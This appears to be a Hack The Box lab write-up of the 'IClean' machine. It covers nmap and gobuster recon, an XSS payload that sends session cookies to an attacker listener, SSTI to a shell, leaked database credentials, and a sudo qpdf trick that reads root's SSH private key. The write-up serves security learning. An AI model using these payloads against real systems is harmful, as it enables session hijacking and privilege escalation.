---
title: HTB - IClean
date: 2024-08-04 00:00:00 + 1000
categories: [Web App,CTF,HTB]
tags: [htb,WebExploitation, XSS, SSTI]
comments: false
---


The IClean is Medium-Rated HTB machine involved exploiting a web application vulnerable to XSS and SSTI, leading to a root shell. It involved grabbing a session cookie, then used the SSTI to gain a shell and found the database credentials, and the gained access as consuela, which allowed for privilege escalation


## Common Enumerations

### Nmap

Running the `nmap -p 22,80 -sC -sV 10.10.11.12 -oA recon/openport` - found two open ports

- SSH - 22
- HTTP - 80

```bash
$ nmap -p- 10.10.11.12 -oA recon/allport
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 19:44 AEST
Nmap scan report for 10.10.11.12
Host is up (0.0044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.57 seconds

$ nmap -p 22,80 -sC -sV 10.10.11.12 -oA recon/openport
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 19:46 AEST
Nmap scan report for 10.10.11.12
Host is up (0.0058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

## Website (port 80)

10.10.11.12 - redirect to `http://capiclean.htb/`. Which I have added to the `/etc/hosts`

![img](/assets/img/IClean/1.webp)

Gobuster found a few interesting endpoints

```bash
$ gobuster dir -u 'http://capiclean.htb/' -w '/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt' -o recon/gobuster

===============================================================                                                                                   
Starting gobuster in directory enumeration mode                                                                                                   
===============================================================                                                                                   
/logout               (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 2106]
/about                (Status: 200) [Size: 5267]
/services             (Status: 200) [Size: 8592]
/dashboard            (Status: 302) [Size: 189] [--> /]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/server-status        (Status: 403) [Size: 278]
/choose               (Status: 200) [Size: 6084]
Progress: 23895 / 30001 (79.65%)[ERROR] parse "http://capiclean.htb/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
```

The `/quote` endpoint looked promising. I noticed a "Service" parameter and decided to play around with it

![img](/assets/img/IClean/2.webp)

### XSS via Service parameter

I created a classic XSS payload using an `<img>` tag with an `onerror` handler

```js
<img src=x onerror=fetch("http://10.10.14.8:1337/"+document.cookie);>
```

Started a simple HTTP server on port 1337 to catch the cookie

```python
$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.11.12 - - [01/May/2024 21:04:32] code 404, message File not found
10.10.11.12 - - [01/May/2024 21:04:32] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZjIhgA.IPjjisRtO1-Abm44368_wa-H4iY HTTP/1.1" 404 -
```

It worked! I had the session cookie

![img](/assets/img/IClean/3.webp)

### SSTI via /QRGenerator

Next, I checked the `/QRGenerator` endpoint. This endpoint seemed vulnerable via `qr_link` parameter. I tried a few things, and after a bit of experimentation, I found it was vulnerable to Server-Side Template Injection (SSTI)

![img](/assets/img/IClean/4.webp)

Using the below payload - [More Info](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------). I was able to execute commands and got the shell

![img](/assets/img/IClean/12.webp)


## Shell as www-data

Now I had a shell, I needed to find a way to escalate my privileges. I took a look at the `app.py` file, where I found the database credentials

```python
# Database Configuration

db_config = {                                                                                                                             
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

```

With these credentials, I logged into the MySQL

```bash
mysql -h 127.0.0.1 -u iclean -p pxCsmnGLckUb
```

I found a user called `consuela` with the password "simple and clean". I used this information to get a shell as `consuela`

![img](/assets/img/IClean/5.webp)

## Shell as consuela

With a shell as `consuela`, I grep the `user.txt`

```
c0116968....
```

I used the `sudo -l` to check for any available `sudo` commands.

![img](/assets/img/IClean/8.webp)

## Root SSH

I found a way to escalate my privileges using the `qpdf`

```bash
sudo /usr/bin/qpdf --empty /tmp/id.txt --qdf --add-attachment /root/.ssh/id_rsa --
```

root.txt

```bash
eb3c0a59...
```


